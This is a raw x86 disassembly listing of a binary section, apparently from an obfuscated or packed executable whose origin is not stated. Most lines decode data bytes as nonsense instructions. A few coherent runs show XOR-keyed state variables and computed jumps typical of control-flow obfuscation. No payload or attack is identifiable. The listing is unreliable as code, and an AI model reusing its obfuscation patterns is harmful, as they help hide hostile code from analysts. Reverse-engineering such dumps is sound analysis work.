  414aa3:	sbb    al,0x17
  414aa5:	jae    0x414aa0
  414aa7:	fisttp DWORD PTR [edx-0xc]
  414aaa:	test   esp,ecx
  414aac:	and    DWORD PTR [esp+ebx*8],ebp
  414aaf:	mov    eax,0x869469f9
  414ab4:	lods   al,BYTE PTR ds:[esi]
  414ab5:	pusha  
  414ab6:	inc    ebp
  414ab7:	in     eax,dx
  414ab8:	xor    ecx,DWORD PTR [ebx]
  414aba:	pushf  
  414abb:	adc    dl,ah
  414abd:	retf   
  414abe:	sbb    edi,0xffffff86
  414ac1:	call   0x1256:0xe073332a
  414ac8:	mov    DWORD PTR [ecx],esp
  414aca:	in     eax,dx
  414acb:	neg    DWORD PTR [ecx+0x65]
  414ace:	fist   DWORD PTR [ecx-0x25691fd3]
  414ad4:	les    edi,FWORD PTR [ebp-0x5e37c5e1]
  414ada:	dec    ecx
  414adb:	stos   BYTE PTR es:[edi],al
  414adc:	inc    bx
  414ade:	dec    ebp
  414adf:	iret   
  414ae0:	xchg   al,dl
  414ae2:	aaa    
  414ae3:	cli    
  414ae4:	cdq    
  414ae5:	aad    0x67
  414ae7:	mov    al,0x0
  414ae9:	das    
  414aea:	int3   
  414aeb:	into   
  414aec:	sbb    eax,0x3a1ece7b
  414af1:	pop    esi
  414af2:	xchg   ebp,eax
  414af3:	jb     0x414adb
  414af5:	test   al,0x62
  414af7:	pop    ds
  414af8:	mov    ?,WORD PTR [edx+0x2f]
  414afb:	retf   0xf1e0
  414afe:	cmp    eax,DWORD PTR [ebp+0x4f]
  414b01:	repz pusha 
  414b03:	sbb    bl,bh
  414b05:	pop    eax
  414b06:	shl    BYTE PTR [esi],0x67
  414b09:	pop    ds
  414b0a:	and    edi,DWORD PTR [ecx]
  414b0c:	mov    esp,0x75c7e571
  414b11:	cmp    al,0xfe
  414b13:	outs   dx,BYTE PTR ds:[esi]
  414b14:	sbb    eax,0xafd4644a
  414b19:	sbb    eax,0x15eac8e5
  414b1e:	ds pop ss
  414b20:	add    al,0xc0
  414b22:	mov    BYTE PTR [esi+0x3cadd016],al
  414b28:	jmp    0x2e59cb1a
  414b2d:	xchg   ebx,eax
  414b2e:	fucomip st,st(7)
  414b30:	stc    
  414b31:	ja     0x414ab8
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	cmp    BYTE PTR [esi+0x7b5bd0f1],dl
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0x770707e
  414bc3:	mov    edi,0x7bc44978
  414bc8:	test   cl,dh
  414bca:	pop    ebx
  414bcb:	ds push esp
  414bcd:	sub    DWORD PTR [ecx-0x1cb3042a],edi
  414bd3:	push   es
  414bd4:	adc    al,BYTE PTR [esi]
  414bd6:	sbb    al,0x64
  414bd8:	pop    ecx
  414bd9:	and    dl,BYTE PTR [esi+0x493fdc62]
  414bdf:	int    0xc7
  414be1:	hlt    
  414be2:	or     DWORD PTR [ebx-0x24],edi
  414be5:	(bad)  
  414be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be7:	test   DWORD PTR [ecx],edi
  414be9:	call   0xa4d8:0x589d1709
  414bf0:	sub    dh,bl
  414bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf3:	dec    eax
  414bf4:	dec    ebx
  414bf5:	jo     0x414c5b
  414bf7:	int    0x64
  414bf9:	in     eax,0x13
  414bfb:	nop
  414bfc:	and    al,0x1a
  414bfe:	dec    esi
  414bff:	dec    DWORD PTR [edx]
  414c01:	or     al,0xb8
  414c03:	mov    ebp,edi
  414c05:	mov    ds:0x75ba84ac,eax
  414c0a:	fst    QWORD PTR [ebp+0x5da0aeea]
  414c10:	int3   
  414c11:	inc    ebx
  414c12:	(bad)  
  414c13:	or     DWORD PTR [esi+0x736e2642],edx
  414c19:	xchg   ecx,eax
  414c1a:	pop    ebx
  414c1b:	jmp    0x414c37
  414c1d:	adc    BYTE PTR [ebx+0x45886c59],dh
  414c23:	repz mov esp,0x67911e90
  414c29:	shl    BYTE PTR [edi],0xf7
  414c2c:	enter  0x8f87,0xf3
  414c30:	popf   
  414c31:	scas   al,BYTE PTR es:[edi]
  414c32:	add    bl,BYTE PTR [ebx+edi*1+0x6e]
  414c36:	inc    esi
  414c37:	pop    edi
  414c38:	out    0xae,eax
  414c3a:	retf   
  414c3b:	cmp    al,BYTE PTR [edx]
  414c3d:	in     eax,0x43
  414c3f:	pmaxsw mm1,QWORD PTR [eax]
  414c42:	iret   
  414c43:	retf   0x95d2
  414c46:	daa    
  414c47:	leave  
  414c48:	xchg   ebp,eax
  414c49:	or     ebp,ebx
  414c4b:	scas   eax,DWORD PTR es:[edi]
  414c4c:	fcmovb st,st(5)
  414c4e:	add    edx,ebp
  414c50:	(bad)  
  414c51:	and    BYTE PTR [ecx+0x74a0efd9],0x31
  414c58:	or     esi,esp
  414c5a:	adc    al,BYTE PTR [ebx]
  414c5c:	inc    ebx
  414c5d:	pop    ecx
  414c5e:	lea    edx,[ebx+0x75]
  414c61:	and    cl,BYTE PTR [ecx-0x1a]
  414c64:	test   eax,0xda6b3ef2
  414c69:	stos   DWORD PTR es:[edi],eax
  414c6a:	cmp    al,0x6b
  414c6c:	cmc    
  414c6d:	sti    
  414c6e:	aaa    
  414c6f:	mov    edi,0xc3bf8b0b
  414c74:	ins    DWORD PTR es:[edi],dx
  414c75:	and    dl,al
  414c77:	and    al,0x60
  414c79:	sar    BYTE PTR [ebx-0x44520ffb],cl
  414c7f:	inc    eax
  414c80:	push   ecx
  414c81:	sbb    esp,DWORD PTR [ebx+0x46ac7728]
  414c87:	xlat   BYTE PTR fs:[ebx]
  414c89:	pop    ecx
  414c8a:	dec    eax
  414c8b:	cmp    ebx,esp
  414c8d:	jp     0x414c77
  414c8f:	call   0xa96b6f92
  414c94:	and    ch,BYTE PTR [esi-0x54430a8c]
  414c9a:	xchg   edx,eax
  414c9b:	jle    0x414c52
  414c9d:	xor    al,0xbf
  414c9f:	popa   
  414ca0:	inc    edx
  414ca1:	(bad)  
  414ca2:	mov    bh,0x97
  414ca4:	xor    ebp,DWORD PTR [ebp+eiz*8-0x753a7c62]
  414cab:	mov    ch,0xbb
  414cad:	sub    BYTE PTR [ebx-0x79],dl
  414cb0:	maskmovq mm2,mm3
  414cb3:	pop    ebx
  414cb4:	mov    bh,0x92
  414cb6:	push   ebx
  414cb7:	std    
  414cb8:	out    0x3b,eax
  414cba:	inc    ecx
  414cbb:	mov    cl,0x9c
  414cbd:	(bad)  
  414cbe:	sbb    esp,DWORD PTR [ebx+0x49c271e9]
  414cc4:	imul   edi,DWORD PTR [eax+ebx*8],0xffffff8b
  414cc8:	enter  0xba8,0x2e
  414ccc:	xchg   ebx,eax
  414ccd:	mov    ah,0xe7
  414ccf:	push   edi
  414cd0:	fcmovne st,st(5)
  414cd2:	in     eax,dx
  414cd3:	sbb    ch,BYTE PTR [ecx-0x23]
  414cd6:	inc    edx
  414cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd8:	bnd js 0x414c6e
  414cdb:	mov    ds:0x930e77c5,eax
  414ce0:	cwde   
  414ce1:	push   ebp
  414ce2:	in     eax,0xbf
  414ce4:	(bad)  
  414ce5:	std    
  414ce6:	cmp    bl,al
  414ce8:	sbb    DWORD PTR [ecx+ecx*2+0x4e1e5711],edi
  414cef:	cmp    eax,0x8d4892a4
  414cf4:	mov    edi,0xebe7518d
  414cf9:	push   edi
  414cfa:	ror    BYTE PTR [edi-0x48d5b149],cl
  414d00:	pop    ebp
  414d01:	xor    esi,DWORD PTR [edx+0xa198b53]
  414d07:	dec    edx
  414d08:	es xor edx,edx
  414d0b:	xchg   ebp,eax
  414d0c:	fisttp QWORD PTR [eax-0x740aebe8]
  414d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d13:	test   DWORD PTR ds:0xa52cc74b,0xcdc522e9
  414d1d:	mov    edi,ebp
  414d1f:	or     bl,dl
  414d21:	mov    cl,0x50
  414d23:	mov    al,0x4a
  414d25:	js     0x414d71
  414d27:	scas   al,BYTE PTR es:[edi]
  414d28:	mov    al,ds:0x9f48cbae
  414d2d:	xor    eax,0x59baa975
  414d32:	mov    WORD PTR [ebp+0x3a808fdf],cs
  414d38:	ins    BYTE PTR es:[edi],dx
  414d39:	sbb    BYTE PTR [eax],ah
  414d3b:	out    dx,al
  414d3c:	mov    ah,0x14
  414d3e:	outs   dx,DWORD PTR ds:[esi]
  414d3f:	dec    edi
  414d40:	add    BYTE PTR [esi+0x5777b71a],bh
  414d46:	adc    BYTE PTR [eax+0x23d0ead8],dh
  414d4c:	sub    BYTE PTR [eax],ah
  414d4e:	jmp    0x414cd1
  414d50:	add    ch,bl
  414d52:	mov    edi,0x18bf2312
  414d57:	enter  0x4c5c,0xdc
  414d5b:	mov    eax,ds:0xd8876647
  414d60:	cmc    
  414d61:	ja     0x414d0b
  414d63:	sbb    BYTE PTR [edx],0xa2
  414d66:	test   al,0x37
  414d68:	adc    al,0x10
  414d6a:	xchg   edx,eax
  414d6b:	push   edi
  414d6c:	xlat   BYTE PTR ds:[ebx]
  414d6d:	sub    ah,BYTE PTR [ecx-0x4b]
  414d70:	mov    edx,0x16498b90
  414d75:	cmp    eax,0x51a170f5
  414d7a:	sti    
  414d7b:	and    edx,esp
  414d7d:	jns    0x414de4
  414d7f:	fbld   TBYTE PTR [edx+0x54c4972e]
  414d85:	pusha  
  414d86:	mov    dh,0x1c
  414d88:	and    al,0xef
  414d8a:	fiadd  DWORD PTR [eax+0x1a]
  414d8d:	push   0x15
  414d8f:	out    dx,eax
  414d90:	out    0x2c,al
  414d92:	(bad)  
  414d93:	fdivp  st(2),st
  414d95:	mov    ds:0x2b77af8d,al
  414d9a:	sbb    al,0x8b
  414d9d:	in     eax,0x8b
  414d9f:	sbb    eax,0x355489e7
  414da4:	mov    edx,0xae7044d4
  414da9:	push   0x44
  414dab:	bound  edi,QWORD PTR [edi+0x49ddbeb5]
  414db1:	dec    eax
  414db2:	cmc    
  414db3:	inc    esp
  414db4:	jo     0x414dc5
  414db6:	adc    BYTE PTR [ebx+0x15],dl
  414db9:	fnsave [edx+0x36ad32be]
  414dbf:	ret    0x1c83
  414dc2:	into   
  414dc3:	mov    bh,0x90
  414dc5:	sbb    BYTE PTR [edi+0x7c855288],al
  414dcb:	pop    ebp
  414dcc:	xchg   edx,eax
  414dcd:	mov    ecx,0x3ea842de
  414dd2:	das    
  414dd3:	or     al,0x14
  414dd5:	loope  0x414e03
  414dd7:	pop    ss
  414dd8:	sub    esp,ecx
  414dda:	ret    
  414ddb:	loop   0x414dcf
  414ddd:	mov    al,ds:0x6afd19f
  414de2:	and    eax,DWORD PTR [edx+ebx*4+0x47f51e2d]
  414de9:	jmp    0xc99b:0x3f0c952c
  414df0:	jb     0x414d73
  414df2:	mov    DWORD PTR [edx-0x22a43c39],eax
  414df8:	jle    0x414da2
  414dfa:	mov    esi,0xe7371c6
  414dff:	dec    ecx
  414e00:	jae    0x414e4b
  414e02:	inc    esp
  414e03:	mov    dl,0xc6
  414e05:	fldenv [ebx+0x4f]
  414e08:	fdiv   DWORD PTR [ebx+0x3b410f33]
  414e0e:	into   
  414e0f:	mov    ch,0x90
  414e11:	cmp    DWORD PTR [edx],esp
  414e13:	or     ebx,DWORD PTR [edi+esi*1-0x9]
  414e17:	mov    dl,BYTE PTR [ebp+0x3]
  414e1a:	sub    bh,ah
  414e1c:	jne    0x414da4
  414e1e:	shr    BYTE PTR [ebx+0x66],1
  414e21:	int3   
  414e22:	cs xchg edi,eax
  414e24:	mov    al,ds:0x9df7f895
  414e29:	mov    edi,0xc647bbb8
  414e2e:	sbb    BYTE PTR [edx-0x13],al
  414e31:	(bad)  
  414e32:	xchg   esi,eax
  414e33:	out    dx,al
  414e34:	inc    ecx
  414e35:	pop    edi
  414e36:	outs   dx,DWORD PTR ds:[esi]
  414e37:	jmp    0xc5a36a3b
  414e3c:	adc    DWORD PTR [edx+0x285722a3],ebp
  414e42:	lods   eax,DWORD PTR ds:[esi]
  414e43:	xchg   edx,eax
  414e44:	repz or DWORD PTR [edx-0x6ec4287a],esp
  414e4b:	(bad)  [ebp+0x2c]
  414e4e:	lods   eax,DWORD PTR ds:[esi]
  414e4f:	sbb    al,0x5e
  414e51:	scas   al,BYTE PTR es:[edi]
  414e52:	mov    dl,0x76
  414e54:	xchg   BYTE PTR [esi+0x7d],al
  414e57:	mov    ecx,DWORD PTR [ecx-0x1a31cfe6]
  414e5d:	mov    ds:0xbf61ed29,al
  414e62:	jmp    0x414eaf
  414e64:	stc    
  414e65:	pusha  
  414e66:	mov    cl,0xdb
  414e68:	sub    BYTE PTR [ebp-0x1b],al
  414e6b:	jno    0x414e51
  414e6d:	stos   BYTE PTR es:[edi],al
  414e6e:	shl    DWORD PTR ds:[eax],1
  414e71:	icebp  
  414e72:	retf   0x460c
  414e75:	into   
  414e76:	cld    
  414e77:	jns    0x414e2e
  414e79:	add    ecx,ecx
  414e7b:	lods   al,BYTE PTR ds:[esi]
  414e7c:	cmp    esi,DWORD PTR [edx+eiz*2-0x5d7f96ea]
  414e83:	mov    bl,0xb9
  414e85:	mov    esi,ebp
  414e87:	imul   esi,edi,0x49056a59
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	aas    
  414ead:	or     al,0xe1
  414eaf:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e4c
  414eb9:	adc    DWORD PTR [edi-0x56bb4057],0x46
  414ec0:	pop    ecx
  414ec1:	or     al,0x80
  414ec3:	jg     0x414e84
  414ec5:	jbe    0x414f35
  414ec7:	bound  esp,QWORD PTR [ebp*1-0x7440d373]
  414ece:	sub    BYTE PTR [edi],ah
  414ed0:	mov    ss,WORD PTR [ebx+esi*8]
  414ed3:	ret    
  414ed4:	jae    0x414e85
  414ed6:	inc    esp
  414ed7:	add    BYTE PTR [edi+ebx*4],al
  414eda:	mov    ebx,0x7594af7f
  414edf:	mov    edx,0xd57b2d81
  414ee4:	lock mov ch,0xce
  414ee7:	icebp  
  414ee8:	and    eax,0x2385d635
  414eed:	jnp    0x414f1f
  414eef:	add    al,BYTE PTR [edi]
  414ef1:	jp     0x414f15
  414ef3:	push   ebx
  414ef4:	mov    eax,ds:0xb986880a
  414ef9:	pop    esi
  414efa:	sub    eax,0xc99955c0
  414eff:	add    BYTE PTR [eax+eiz*2-0x67],0xa8
  414f04:	stos   DWORD PTR es:[edi],eax
  414f05:	(bad)  
  414f06:	cdq    
  414f07:	scas   eax,DWORD PTR es:[edi]
  414f08:	push   0xfffffffd
  414f0a:	inc    esi
  414f0b:	mov    dl,0xbc
  414f0d:	push   esi
  414f0e:	mov    edi,?
  414f10:	dec    esi
  414f11:	dec    esi
  414f12:	mov    esi,0xa84248f2
  414f17:	inc    ecx
  414f18:	icebp  
  414f19:	rcr    DWORD PTR [esi],1
  414f1b:	in     eax,0x3e
  414f1d:	sbb    eax,0xd9b90fc
  414f22:	add    eax,0x29570a84
  414f27:	xchg   esp,ebp
  414f29:	(bad)  
  414f2a:	data16 jne 0x414eba
  414f2d:	sahf   
  414f2e:	mov    ebp,0x8c72486b
  414f33:	pop    esi
  414f34:	inc    ecx
  414f35:	add    DWORD PTR [edx-0x6df39a0c],ebx
  414f3b:	adc    al,0x3d
  414f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3e:	js     0x414fb8
  414f40:	ja     0x414ec6
  414f42:	ja     0x414f9c
  414f44:	xlat   BYTE PTR ds:[ebx]
  414f45:	dec    edx
  414f46:	push   edi
  414f47:	cmp    DWORD PTR [eax-0x2c],0x67
  414f4b:	test   al,0x69
  414f4d:	cs ds pop ecx
  414f50:	in     al,dx
  414f51:	sub    ch,cl
  414f53:	call   0x45e5b63c
  414f58:	cwde   
  414f59:	push   es
  414f5a:	daa    
  414f5b:	jecxz  0x414f53
  414f5d:	lahf   
  414f5e:	push   edx
  414f5f:	cld    
  414f60:	cwde   
  414f61:	div    DWORD PTR [edi+edx*8-0x42ccf109]
  414f68:	icebp  
  414f69:	xor    edx,edi
  414f6b:	mov    ds:0xc2202d7a,ax
  414f71:	in     al,dx
  414f72:	aam    0x2b
  414f74:	jmp    0x414fb4
  414f76:	mov    esp,0x72a20487
  414f7b:	in     al,0xc8
  414f7d:	(bad)  
  414f7e:	in     eax,0x0
  414f80:	call   0x4ab9cf4f
  414f85:	xchg   edi,esi
  414f87:	out    dx,al
  414f88:	(bad)  
  414f89:	push   ss
  414f8a:	adc    eax,0xdb6299f0
  414f8f:	pop    eax
  414f90:	scas   eax,DWORD PTR es:[edi]
  414f91:	aas    
  414f92:	mov    gs,WORD PTR [edi+0x4a]
  414f95:	loop   0x414fb3
  414f97:	jnp    0x415007
  414f99:	test   DWORD PTR [edi+0x10],ebx
  414f9c:	stc    
  414f9d:	adc    DWORD PTR [ebx],ecx
  414f9f:	adc    DWORD PTR [ebx+eax*4],esi
  414fa2:	adc    DWORD PTR [ecx],esi
  414fa4:	shr    DWORD PTR [ebx-0x1f75b74b],cl
  414faa:	mov    ds:0xab822753,eax
  414faf:	ss cs mov ecx,0xdac85b3d
  414fb6:	fsub   DWORD PTR [edi+0x3f]
  414fb9:	mov    edi,edx
  414fbb:	neg    DWORD PTR [edx-0x1c]
  414fbe:	jp     0x414f41
  414fc0:	(bad)  
  414fc1:	mov    esp,edx
  414fc3:	pop    edx
  414fc4:	lods   eax,DWORD PTR ds:[esi]
  414fc5:	push   esp
  414fc6:	adc    eax,DWORD PTR [eax-0x53]
  414fc9:	enter  0xbc3e,0x1b
  414fcd:	pop    eax
  414fce:	push   cs
  414fcf:	mov    ch,0xae
  414fd1:	nop
  414fd2:	and    al,0x5e
  414fd4:	xchg   esi,eax
  414fd5:	mov    ecx,0x6744ab62
  414fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fdb:	sub    cl,dh
  414fdd:	and    BYTE PTR [ebp+0x6be03ea8],dh
  414fe3:	add    al,0xda
  414fe5:	mov    DWORD PTR [ebp+0x28947853],edi
  414feb:	(bad)  
  414fec:	cmp    eax,0x7cb0dc2e
  414ff1:	jg     0x415033
  414ff3:	pop    es
  414ff4:	sub    esi,DWORD PTR [ecx+eax*1]
  414ff7:	test   al,0xaf
  414ff9:	add    BYTE PTR [edx-0x306a1936],ah
  414fff:	les    ecx,FWORD PTR [ecx]
  415001:	adc    al,0x63
  415003:	stc    
  415004:	push   es
  415005:	xor    ecx,DWORD PTR [esi]
  415007:	ret    
  415008:	mov    dl,0x59
  41500a:	fstp   QWORD PTR [ecx]
  41500c:	mov    dl,0x99
  41500e:	int3   
  41500f:	sti    
  415010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415011:	or     ebp,ebp
  415013:	(bad)  
  415014:	xchg   ecx,eax
  415015:	(bad)  
  415016:	adc    al,0x98
  415018:	in     eax,0xa
  41501a:	cmp    DWORD PTR [edi],eax
  41501c:	aad    0xb3
  41501e:	and    DWORD PTR es:[eax],esi
  415021:	scas   eax,DWORD PTR es:[edi]
  415022:	pushf  
  415023:	js     0x414fc2
  415025:	rcl    DWORD PTR [ebp+0x3],cl
  415028:	in     al,dx
  415029:	loop   0x414fca
  41502b:	sbb    esi,DWORD PTR [edx+edx*2+0x3f152015]
  415032:	add    bh,BYTE PTR [esi+ebx*4+0x5e48db57]
  415039:	mov    ah,0x7b
  41503b:	leave  
  41503c:	sub    eax,DWORD PTR [edi+eiz*4-0x1d86a9ca]
  415043:	popa   
  415044:	or     al,0xb9
  415046:	pusha  
  415047:	or     BYTE PTR [esi],al
  415049:	dec    esp
  41504a:	dec    esi
  41504b:	pop    ebx
  41504c:	inc    ecx
  41504d:	mov    edx,0x4c4a9445
  415052:	ret    0x9ed2
  415055:	imul   DWORD PTR [esi]
  415057:	and    al,0x7b
  415059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41505a:	(bad)  
  41505b:	imul   DWORD PTR [edx]
  41505d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41505e:	xchg   ecx,eax
  41505f:	sbb    al,0xd6
  415061:	rcl    DWORD PTR [ebp+0x35618cea],1
  415067:	or     cl,BYTE PTR [edi+0x54]
  41506a:	mov    eax,0xe2b0275f
  41506f:	sub    ch,cl
  415071:	pop    ss
  415072:	sbb    dl,BYTE PTR [esi+0x7400305b]
  415078:	sbb    ecx,ecx
  41507a:	(bad)  
  41507b:	jns    0x415089
  41507d:	std    
  41507e:	sub    esp,ecx
  415080:	push   edi
  415081:	push   ebp
  415082:	mov    bh,0x72
  415084:	add    ecx,ebx
  415086:	call   0x2dd079c5
  41508b:	or     DWORD PTR [ecx-0x57],edx
  41508e:	mov    ecx,DWORD PTR [ebx]
  415090:	inc    edx
  415091:	jne    0x41504f
  415093:	inc    ebx
  415094:	sar    DWORD PTR [ebx-0x40],1
  415097:	sub    eax,0x5ce79147
  41509c:	cmp    dh,0x98
  41509f:	jle    0x415066
  4150a1:	in     al,0x36
  4150a3:	cmc    
  4150a4:	cwde   
  4150a5:	sbb    eax,ecx
  4150a7:	pop    esp
  4150a8:	pop    edi
  4150a9:	pusha  
  4150aa:	mov    ds:0xde8571b3,eax
  4150af:	rol    BYTE PTR [eax-0x44],1
  4150b2:	cs xor ebx,ebp
  4150b5:	push   0xdf6db29
  4150ba:	fnstsw WORD PTR [edi-0x19]
  4150bd:	les    esp,FWORD PTR [esi]
  4150bf:	jecxz  0x41508e
  4150c1:	push   ecx
  4150c2:	out    dx,al
  4150c3:	cli    
  4150c4:	pop    esp
  4150c5:	jg     0x41510c
  4150c7:	loopne 0x4150b1
  4150c9:	loop   0x415122
  4150cb:	repnz nop
  4150cd:	add    BYTE PTR [ecx+0x63],dh
  4150d0:	jae    0x41511f
  4150d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d3:	and    al,0xe2
  4150d5:	mov    BYTE PTR [ecx+0x47],0x54
  4150d9:	add    al,0x74
  4150db:	or     DWORD PTR [edx-0x1f38bb09],0x35
  4150e2:	cmp    bh,ch
  4150e4:	mov    dl,0xd6
  4150e6:	fisttp QWORD PTR [eax]
  4150e8:	nop
  4150e9:	(bad)  
  4150ea:	or     al,0x55
  4150ec:	push   edi
  4150ed:	add    ah,al
  4150ef:	and    ebp,DWORD PTR [ebx-0x62a7da36]
  4150f5:	xor    eax,0x5426a2e3
  4150fa:	and    ebp,DWORD PTR [eax-0x49056952]
  415100:	add    esp,DWORD PTR [eax-0x15745b3a]
  415106:	scas   al,BYTE PTR es:[edi]
  415107:	push   eax
  415108:	ds dec esp
  41510a:	pop    ecx
  41510b:	iret   
  41510c:	shl    BYTE PTR [ebx],0xaf
  41510f:	mov    esi,0x8e693c02
  415114:	xor    eax,0xd6bdf059
  415119:	aam    0x19
  41511b:	mov    ds:0x71103755,al
  415120:	add    DWORD PTR [edi],esi
  415122:	mov    edi,0x7d86ab9c
  415127:	(bad)  
  415128:	ss xchg ebp,eax
  41512a:	xor    eax,0xd15b36bc
  41512f:	lds    ebx,FWORD PTR [esi+0x4d948565]
  415135:	sbb    edi,DWORD PTR [eax+ecx*1]
  415138:	leave  
  415139:	jbe    0x415100
  41513b:	sbb    cl,BYTE PTR [ebx+eax*4+0x2c9982c0]
  415142:	mov    al,0x52
  415144:	sbb    al,0x6f
  415146:	rcr    DWORD PTR [esi+edx*4+0x74b064ae],1
  41514d:	mov    dl,0xcc
  41514f:	or     al,0xe7
  415151:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  415153:	jb     0x4151a7
  415155:	shl    BYTE PTR [ecx+0x38b00525],cl
  41515b:	icebp  
  41515c:	fcmovbe st,st(2)
  41515e:	sub    dl,BYTE PTR [eax+eax*1]
  415161:	or     bh,BYTE PTR [ecx-0x5b2c8683]
  415167:	mov    ds:0x1b3c41f2,eax
  41516c:	xchg   ebx,eax
  41516d:	cwde   
  41516e:	hlt    
  41516f:	fmul   DWORD PTR [ecx]
  415171:	add    al,0x4c
  415173:	sti    
  415174:	jmp    0x7801fd7a
  415179:	in     eax,0xe2
  41517b:	out    0x5a,eax
  41517d:	sbb    ebp,esi
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstcw WORD PTR [edx-0x12df6504]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	lods   al,BYTE PTR ds:[esi]
  4151b1:	xor    eax,0x4e0c6757
  4151b6:	xchg   esp,eax
  4151b7:	jge    0x415159
  4151b9:	lahf   
  4151ba:	pop    es
  4151bb:	dec    eax
  4151bc:	cs lock jge 0x4151cb
  4151c0:	pop    ebp
  4151c1:	mov    eax,0xa1449158
  4151c6:	in     eax,0x75
  4151c8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4151ca:	fisttp WORD PTR [esp+edi*2-0x19]
  4151ce:	lods   al,BYTE PTR ds:[esi]
  4151cf:	cmc    
  4151d0:	cmp    al,0x21
  4151d2:	push   ebx
  4151d3:	or     bh,BYTE PTR [ecx-0x2b01e0c9]
  4151d9:	hlt    
  4151da:	pop    ebp
  4151db:	in     eax,dx
  4151dc:	inc    edx
  4151dd:	dec    ebx
  4151de:	jo     0x415213
  4151e0:	inc    ebx
  4151e1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4151e3:	xor    dh,dl
  4151e5:	scas   eax,DWORD PTR es:[edi]
  4151e6:	adc    ecx,DWORD PTR [edx+edi*8-0x460cbfa7]
  4151ed:	and    BYTE PTR [esi+edx*1+0x33],dl
  4151f1:	nop
  4151f2:	mov    ds:0xa9e0ea97,al
  4151f7:	imul   BYTE PTR [ecx+0xc]
  4151fa:	cmp    dh,BYTE PTR [esi]
  4151fc:	aaa    
  4151fd:	push   ss
  4151fe:	ret    0x795e
  415201:	je     0x415206
  415203:	push   esi
  415204:	(bad)  
  415205:	mov    ecx,0xcf46a89d
  41520a:	pop    ebp
  41520b:	dec    eax
  41520c:	add    BYTE PTR [ebx],ah
  41520e:	or     al,0xa3
  415210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415211:	loopne 0x4151fd
  415213:	jmp    0x2bd3fa61
  415218:	call   0x70d0065d
  41521d:	pop    esp
  41521e:	add    al,0xf0
  415220:	outs   dx,DWORD PTR ds:[esi]
  415221:	and    eax,0xc628a092
  415226:	cmp    dh,BYTE PTR [ebx+0x5a]
  415229:	ret    0x161b
  41522c:	mov    bh,0x93
  41522e:	xchg   ebx,eax
  41522f:	pop    ss
  415230:	mov    BYTE PTR [eax],bl
  415232:	mul    dh
  415234:	jl     0x41528b
  415236:	cwde   
  415237:	push   ss
  415238:	(bad)
  41523c:	push   ds
  41523d:	jmp    0x4151d8
  41523f:	sbb    BYTE PTR [edx+ebp*1],0x7e
  415243:	mul    eax
  415245:	in     eax,0xd9
  415247:	lods   al,BYTE PTR ds:[esi]
  415248:	mov    ecx,0xf013132b
  41524d:	jmp    0xadea687d
  415252:	out    dx,eax
  415253:	fsub   DWORD PTR [esi-0x7e00a681]
  415259:	out    dx,al
  41525a:	jnp    0x415290
  41525c:	xchg   edi,eax
